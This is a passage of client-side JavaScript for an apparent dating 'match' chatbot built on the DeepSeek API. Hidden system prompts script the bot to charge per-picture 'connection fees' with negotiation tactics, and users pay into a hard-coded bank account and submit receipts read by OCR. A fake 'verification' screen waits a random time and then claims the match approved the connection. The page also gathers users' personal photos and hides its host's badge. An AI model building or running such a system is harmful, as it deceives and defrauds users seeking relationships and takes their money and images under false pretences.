    <!-- Instant iOS Detection & Disable Pinch/Double-Tap Zoom on iOS -->
    <script>
        if (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream) {
            document.documentElement.classList.add('platform-ios');
        }

        document.addEventListener('gesturestart', function (e) {
            e.preventDefault();
        });

        let lastTouchEnd = 0;
        document.addEventListener('touchend', function (e) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                e.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
    </script>

    <!-- AUTOMATIC NETLIFY BADGE REMOVER & AUTO-REFRESH ON RETURN -->
    <script>
        function removeNetlifyBadge() {
            const possibleBadges = document.querySelectorAll('iframe[src*="netlify"], #netlify-modal-root, .netlify-identity-widget, div[style*="position: fixed"][style*="bottom"]');
            possibleBadges.forEach(el => {
                if (el.id !== 'install-overlay' && !el.classList.contains('input-area') && !el.classList.contains('verify-overlay')) {
                    el.remove();
                }
            });
        }

        const badgeObserver = new MutationObserver(() => {
            removeNetlifyBadge();
        });

        if (document.documentElement) {
            badgeObserver.observe(document.documentElement, { childList: true, subtree: true });
        }

        window.addEventListener('DOMContentLoaded', removeNetlifyBadge);
        window.addEventListener('load', removeNetlifyBadge);
    </script>

            localStorage.setItem('deepseek_chat_history', JSON.stringify(chatHistory));
        } catch (e) {
            console.error('Storage error:', e);
        }
    }

    function stripAsterisks(str) {
        return str ? str.replace(/\*/g, '') : '';
    }

    function renderChatMessages() {
        const chatBox = document.getElementById('chatBox');
        chatBox.innerHTML = '';
        chatHistory.forEach(msg => {
            if (msg.role === 'system') return;
            const div = document.createElement('div');
            div.className = `message ${msg.role === 'assistant' ? 'bot' : 'user'}`;
            
            if (msg.imageUrl) {
                div.innerHTML = `<img src="${msg.imageUrl}" onclick="window.open('${msg.imageUrl}', '_blank')">${formatText(msg.displayCaption || '')}`;
            } else {
                div.innerHTML = formatText(msg.content);
            }

            chatBox.appendChild(div);
        });
        chatBox.scrollTop = chatBox.scrollHeight;
    }

    function checkPersistentButtonState() {
        const isPaid = localStorage.getItem('membership_fee_paid') === 'true';
        const galleryCompleted = localStorage.getItem('gallery_selection_completed') === 'true';
        const savedUrl = localStorage.getItem('unlocked_gallery_url') || pendingCategoryPage;
        const savedName = localStorage.getItem('unlocked_gallery_name') || pendingCategoryName;
        
        const area = document.getElementById('persistentButtonArea');
        const btn = document.getElementById('persistentLinkBtn');
        const inputAreaBox = document.getElementById('inputAreaBox');

        if (galleryCompleted || window.location.search.includes('returned=gallery')) {
            area.style.display = 'none';
            inputAreaBox.classList.remove('disabled');
            return;
        }

        if (isPaid && savedUrl) {
            btn.href = savedUrl;
            btn.innerText = `Click Here to Open ${savedName || 'Match'} Gallery`;
            area.style.display = 'block';
            inputAreaBox.classList.add('disabled');
        } else {
            area.style.display = 'none';
            inputAreaBox.classList.remove('disabled');
        }
    }

    function checkReturnHandshake() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('returned') === 'gallery') {
            localStorage.setItem('gallery_selection_completed', 'true');
            const savedImages = JSON.parse(localStorage.getItem('pending_match_images') || '[]');
            const photoCount = savedImages.length;
            
            if (savedImages.length > 0) {
                savedImages.forEach(imgUrl => {
                    chatHistory.push({
                        role: "user",
                        content: "Here is the picture of the person I am interested in.",
                        imageUrl: imgUrl,
                        displayCaption: "Here is the person I am interested in."
                    });
                });
                localStorage.removeItem('pending_match_images');
            }

            const activeCat = localStorage.getItem('pending_category_name') || 'Serious Relationship in Nigeria';
            const backendPrompt = `[System Backend Event]: Candidate submitted ${photoCount} profile photo(s) from the match gallery for category "${activeCat}". Continue from Question 5 now. Ask them to send a picture of yourself so you can submit it to your match. DO NOT ask for payment or connection fee here.`;
            chatHistory.push({ role: "system", content: backendPrompt });
            saveChatHistory();
            window.history.replaceState({}, document.title, window.location.pathname);
            
            const inputAreaBox = document.getElementById('inputAreaBox');
            if (inputAreaBox) inputAreaBox.classList.remove('disabled');
            const area = document.getElementById('persistentButtonArea');
            if (area) {
                area.style.display = 'none';
            }

            triggerDeepSeekResponse();
        }
    }

    function handleFileSelect(input) {
        if (input.files && input.files[0]) {
            document.getElementById('file-name').textContent = input.files[0].name;
            document.getElementById('file-preview').style.display = 'flex';
            toggleInputButton();
        }
    }

    function clearFile() {
        document.getElementById('fileInput').value = '';
        document.getElementById('file-preview').style.display = 'none';
        toggleInputButton();
    }

    function toggleInputButton() {
        const text = document.getElementById('messageInput').value.trim();
        const file = document.getElementById('fileInput').files[0];
        const btn = document.getElementById('mainActionBtn');
        
        if (text || file) {
            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>`;
        } else if (!isRecording) {
            btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v1a7 7 0 0 1-14 0v-1"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>`;
        }
    }

    let mediaRecorder, audioChunks = [], recordedAudioBlob = null, isRecording = false;
    const actionBtn = document.getElementById('mainActionBtn');

    actionBtn.addEventListener('pointerdown', (e) => {
        const text = document.getElementById('messageInput').value.trim();
        const file = document.getElementById('fileInput').files[0];
        if (!text && !file) { e.preventDefault(); startRecording(); }
    });

    actionBtn.addEventListener('pointerup', (e) => { if (isRecording) { e.preventDefault(); stopRecording(); } });

    async function startRecording() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                stream.getTracks().forEach(track => track.stop());
                if (audioChunks.length > 0) {
                    recordedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    sendMessage();
                }
            };
            mediaRecorder.start();
            isRecording = true;
            actionBtn.classList.add('recording');
            actionBtn.innerHTML = `⏹`;
        } catch (err) { alert('Microphone access denied.'); }
    }

    function stopRecording() {
        if (mediaRecorder && isRecording) {
            mediaRecorder.stop();
            isRecording = false;
            actionBtn.classList.remove('recording');
            toggleInputButton();
        }
    }

    actionBtn.addEventListener('click', () => {
        const text = document.getElementById('messageInput').value.trim();
        const file = document.getElementById('fileInput').files[0];
        if (text || file) sendMessage();
    });

    document.getElementById('messageInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });

    function extractReceiptNumber(text) {
        if (!text) return null;
        const patterns = [
            /(?:Transaction\s*No\.?|Session\s*ID|Ref\s*No\.?|Txn\s*ID|Reference)\s*[:\s]*([A-Za-z0-9]{10,35})/i,
            /\b(202\d{10,25})\b/,
            /\b([0-9]{15,30})\b/
        ];
        for (let pattern of patterns) {
            const match = text.match(pattern);
            if (match && match[1]) return match[1].trim();
        }
        return null;
    }

    async function sendMessage() {
        if (isSending) return;

        const textInput = document.getElementById('messageInput');
        const fileInput = document.getElementById('fileInput');
        const text = textInput.value.trim();
        const file = fileInput.files[0];

        if (!text && !file && !recordedAudioBlob) return;

        isSending = true;

        let apiUserPayload = text || "Uploaded image/receipt";
        let displayObj = { role: "user", content: text };
        const attachedFile = file;

        if (attachedFile && attachedFile.type.startsWith('image/')) {
            const imgUrl = URL.createObjectURL(attachedFile);
            displayObj.imageUrl = imgUrl;
            displayObj.displayCaption = text;
        } else if (recordedAudioBlob) {
            apiUserPayload = "[User sent voice note]";
            displayObj.content = "🎤 Voice Note";
        }

        displayObj.content = apiUserPayload;
        chatHistory.push(displayObj);

        textInput.value = '';
        clearFile();
        recordedAudioBlob = null;
        toggleInputButton();
        saveChatHistory();
        renderChatMessages();

        const lastBotMsg = chatHistory.length >= 2 ? chatHistory[chatHistory.length - 2].content.toLowerCase() : '';
        const isPersonalPhotoSubmission = attachedFile && (lastBotMsg.includes('picture of yourself') || lastBotMsg.includes('photo of yourself'));

        if (attachedFile && attachedFile.type.startsWith('image/')) {
            appendLoadingMessage('Typing...');
            try {
                const ocrResult = await Tesseract.recognize(attachedFile, 'eng');
                const extractedText = ocrResult.data.text;
                apiUserPayload += ` [Backend OCR Extracted Text: ${extractedText}]`;

                const receiptNo = extractReceiptNumber(extractedText);
                if (receiptNo) {
                    if (usedReceiptNumbers.includes(receiptNo)) {
                        removeLoadingMessage();
                        const duplicateMsg = "This receipt has already been used by a different user. Please make your payment and send a valid receipt.";
                        chatHistory.push({ role: "assistant", content: duplicateMsg });
                        saveChatHistory();
                        renderChatMessages();
                        isSending = false;
                        return;
                    } else {
                        usedReceiptNumbers.push(receiptNo);
                        localStorage.setItem('used_receipt_numbers', JSON.stringify(usedReceiptNumbers));
                    }
                }
            } catch(e) {
                apiUserPayload += ` [Backend Image Uploaded]`;
            }
            chatHistory[chatHistory.length - 1].content = apiUserPayload;
            saveChatHistory();
        } else {
            appendLoadingMessage('Typing...');
        }

        if (isPersonalPhotoSubmission) {
            removeLoadingMessage();
            isSending = false;
            
            const verifyOverlay = document.getElementById('verifyOverlay');
            verifyOverlay.classList.add('show');

            const randomWaitTime = Math.floor(Math.random() * (50000 - 10000 + 1)) + 10000;

            setTimeout(() => {
                verifyOverlay.classList.remove('show');
                const activeCat = localStorage.getItem('pending_category_name') || 'Serious Relationship in Nigeria';
                const approvalPrompt = `[System Backend Event]: Match verification completed successfully for category "${activeCat}". The match has approved the connection request based on the selected pictures. Send Question 6 now using the correct connection fee rules for "${activeCat}" (₦4000 per picture for serious relationship with negotiation to ₦3000 for 1 picture or 25% off for multiple pictures, ₦3000 per picture for casual/hookup/benefits with negotiation to ₦2000 for 1 picture or 25% off for multiple pictures, or budget negotiation for sugar mommy / foreign chat). DO NOT use ₦1000.`;
                chatHistory.push({ role: "system", content: approvalPrompt });
                saveChatHistory();
                appendLoadingMessage('Typing...');
                triggerDeepSeekResponse();
            }, randomWaitTime);

            return;
        }

        triggerDeepSeekResponse();
    }

    async function triggerDeepSeekResponse() {
        const cleanApiPayload = chatHistory.map(msg => ({
            role: msg.role === 'system' ? 'system' : msg.role === 'assistant' ? 'assistant' : 'user',
            content: stripAsterisks(msg.content || 'Image attached')
        }));

        try {
            const response = await fetch(DEEPSEEK_API_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${API_KEY}`
                },
                body: JSON.stringify({
                    model: "deepseek-chat",
                    messages: cleanApiPayload,
                    stream: false
                })
            });

            const data = await response.json();
            removeLoadingMessage();

            let reply = data.choices && data.choices[0] ? data.choices[0].message.content : "Understood.";
            
            let shouldUnlockButton = false;
            if (reply.includes('[PAYMENT_VERIFIED_UNLOCK]')) {
                shouldUnlockButton = true;
                reply = reply.replace('[PAYMENT_VERIFIED_UNLOCK]', '');
            }

            let shouldShowChangeButton = false;
            if (reply.includes('[SHOW_CHANGE_MATCH_BUTTON]')) {
                shouldShowChangeButton = true;
                reply = reply.replace('[SHOW_CHANGE_MATCH_BUTTON]', '');
            }

            reply = stripAsterisks(reply);

            chatHistory.push({ role: "assistant", content: reply });
            saveChatHistory();
            renderChatMessages();

            trackCategoryChoice(reply, chatHistory[chatHistory.length - 2].content);

            if (shouldUnlockButton && pendingCategoryPage) {
                unlockGalleryButton();
            }

            if (shouldShowChangeButton && pendingCategoryPage) {
                showChangeMatchButton();
            }

        } catch (err) {
            removeLoadingMessage();
            chatHistory.push({ role: "assistant", content: "Network connection error. Please try again." });
            saveChatHistory();
            renderChatMessages();
        } finally {
            isSending = false;
        }
    }

    function trackCategoryChoice(botReply, userMsg) {
        const combined = (botReply + " " + userMsg).toLowerCase();

        if (combined.includes('sugar') || combined.includes('mommy') || combined.includes('daddy') || combined.includes('2000')) {
            pendingCategoryPage = 'sugar_mommy.html'; pendingCategoryName = 'Sugar Mommy / Daddy';
        } else if (combined.includes('chat') || combined.includes('rich people abroad') || combined.includes('8000')) {
            pendingCategoryPage = 'paid_chat.html'; pendingCategoryName = 'Get Paid For Chatting';
        } else if (combined.includes('outside nigeria') || combined.includes('5000')) {
            pendingCategoryPage = 'serious_int.html'; pendingCategoryName = 'Serious Relationship Outside Nigeria';
        } else if (combined.includes('hookup') || combined.includes('benefit') || combined.includes('video call') || combined.includes('tape') || combined.includes('1500') || combined.includes('1000')) {
            pendingCategoryPage = 'media_exchange.html'; pendingCategoryName = 'Casual Connections';
        } else if (combined.includes('relationship in nigeria') || combined.includes('serious relationship in nigeria')) {
            pendingCategoryPage = 'serious_ng.html'; pendingCategoryName = 'Serious Relationship in Nigeria';
        }

        if (pendingCategoryPage) {
            localStorage.setItem('pending_category_page', pendingCategoryPage);
            localStorage.setItem('pending_category_name', pendingCategoryName);
        }
    }

    function unlockGalleryButton() {
        if (!pendingCategoryPage) return;
        localStorage.setItem('membership_fee_paid', 'true');
        localStorage.setItem('unlocked_gallery_url', pendingCategoryPage);
        localStorage.setItem('unlocked_gallery_name', pendingCategoryName);
        
        const area = document.getElementById('persistentButtonArea');
        const btn = document.getElementById('persistentLinkBtn');
        const inputAreaBox = document.getElementById('inputAreaBox');

        btn.href = pendingCategoryPage;
        btn.innerText = `Click Here to Open ${pendingCategoryName} Gallery`;
        area.style.display = 'block';
        inputAreaBox.classList.add('disabled');
    }

    function showChangeMatchButton() {
        if (!pendingCategoryPage) return;
        const savedUrl = localStorage.getItem('unlocked_gallery_url') || pendingCategoryPage;
        const savedName = localStorage.getItem('unlocked_gallery_name') || 'Match';
        
        const area = document.getElementById('persistentButtonArea');
        const btn = document.getElementById('persistentLinkBtn');
        const inputAreaBox = document.getElementById('inputAreaBox');

        btn.href = savedUrl;
        btn.innerText = `Click Here to Open ${savedName} Gallery`;
        area.style.display = 'block';
        inputAreaBox.classList.add('disabled');
    }

    function formatText(text) {
        if (!text) return '';
        let html = stripAsterisks(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        html = html.replace(/6765911129/g, `<span class="copy-btn" onclick="copyAccount('6765911129', this)">6765911129 📋</span>`);

        const urlRegex = /(https?:\/\/[^\s]+|www\.[^\s]+)/g;
        html = html.replace(urlRegex, url => `<a href="${url}" target="_blank">${url}</a>`);
        return html.replace(/\n/g, '<br>');
    }

    function copyAccount(accNum, el) {
        navigator.clipboard.writeText(accNum).then(() => {
            const original = el.innerHTML;
            el.innerHTML = "Copied ✓";
            setTimeout(() => { el.innerHTML = original; }, 2000);
        });
    }

    function appendLoadingMessage(txt = 'Typing...') {
        removeLoadingMessage();
        const chatBox = document.getElementById('chatBox');
        const div = document.createElement('div');
        div.className = `message bot loading`;
        div.id = 'loading-msg';
        div.textContent = txt;
        chatBox.appendChild(div);
        chatBox.scrollTop = chatBox.scrollHeight;
        return 'loading-msg';
    }

    function removeLoadingMessage() {
        const el = document.getElementById('loading-msg');
        if (el) el.remove();
    }

    // --- PWA Installation Logic ---
    let deferredPrompt;
    const installBtn = document.getElementById('install-btn');
    const ua = navigator.userAgent;
    const isIOSDevice = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    const isAndroid = /Android/i.test(ua);
    const isInAppBrowser = /FBAN|FBAV|FB_IAB|Instagram|Line\/|Snapchat|TikTok|musical_ly|Twitter|MicroMessenger|GSA\//i.test(ua) || (isAndroid && /; wv\)/.test(ua));
    const isIOSSafari = isIOSDevice && /Safari/i.test(ua) && !/CriOS|FxiOS|EdgiOS|OPiOS/i.test(ua) && !isInAppBrowser;
    const isStandalone = () => window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;

    if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js').catch(() => {}));
    }

    if (isStandalone()) {
        installBtn.style.display = 'none';
    }

    window.addEventListener('beforeinstallprompt', (e) => { 
        e.preventDefault(); 
        deferredPrompt = e; 
        if (!isIOSDevice && !isStandalone()) {
            installBtn.style.display = 'inline-block';
        }
    });

    window.addEventListener('appinstalled', () => { 
        installBtn.style.display = 'none'; 
        deferredPrompt = null; 
        closeInstallGuide(); 
    });

    const shareIcon = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0a84ff" stroke-width="2" style="vertical-align:-3px"><path d="M12 3v12M7 8l5-5 5 5"/><path d="M5 12v8h14v-8"/></svg>';

    function showInstallGuide(html) {
        document.getElementById('install-guide-body').innerHTML = html;
        document.getElementById('install-overlay').classList.add('show');
    }
    function closeInstallGuide() {
        document.getElementById('install-overlay').classList.remove('show');
    }
    function copyPageLink() {
        const done = () => alert('Link copied. Paste it in ' + (isIOSDevice ? 'Safari' : 'Chrome') + ' to install the app.');
        if (navigator.clipboard) navigator.clipboard.writeText(location.href).then(done, () => prompt('Copy this link:', location.href));
        else prompt('Copy this link:', location.href);
    }
    function openInChrome() {
        location.href = 'intent://' + location.host + location.pathname + location.search + '#Intent;scheme=https;package=com.android.chrome;end';
    }

    async function installApp() {
        if (isStandalone()) return;

        if (deferredPrompt) {
            deferredPrompt.prompt();
            const { outcome } = await deferredPrompt.userChoice;
            if (outcome === 'accepted') {
                installBtn.style.display = 'none';
            }
            deferredPrompt = null;
            return;
        }

        if (isIOSDevice) {
            if (!isIOSSafari) {
                showInstallGuide(`
                    <p>To add this app to your Home Screen, open this page in <b>Safari</b>.</p>
                    <ol>
                        <li>Tap <b>Copy Link</b> below.</li>
                        <li>Open <b>Safari</b> and paste the link.</li>
                        <li>Tap the <b>Share</b> button ${shareIcon}, then <b>"Add to Home Screen"</b>.</li>
                    </ol>
                    <button class="primary" onclick="copyPageLink()">Copy Link</button>`);
                return;
            }
            showInstallGuide(`
                <ol>
                    <li>Tap the <b>Share</b> button ${shareIcon} in the Safari toolbar.</li>
                    <li>Scroll down and tap <b>"Add to Home Screen"</b> ➕.</li>
                    <li>Tap <b>"Add"</b> in the top-right corner.</li>
                </ol>`);
            return;
        }

        if (isAndroid && isInAppBrowser) {
            showInstallGuide(`
                <p>This browser can't install apps. Open this page in <b>Chrome</b> to add it to your Home Screen.</p>
                <button class="primary" onclick="openInChrome()">Open in Chrome</button>
                <button class="secondary" onclick="copyPageLink()">Copy Link</button>`);
            return;
        }

        if (isAndroid) {
            showInstallGuide(`
                <ol>
                    <li>Tap the browser menu <b>⋮</b> (top-right corner).</li>
                    <li>Tap <b>"Install app"</b> or <b>"Add to Home screen"</b>.</li>
                    <li>Tap <b>"Install"</b> to confirm.</li>
                </ol>`);
            return;
        }

        showInstallGuide(`<p>Open this page on your phone, or use your browser's menu and choose <b>"Install"</b> to add this app.</p>`);
    }
</script>
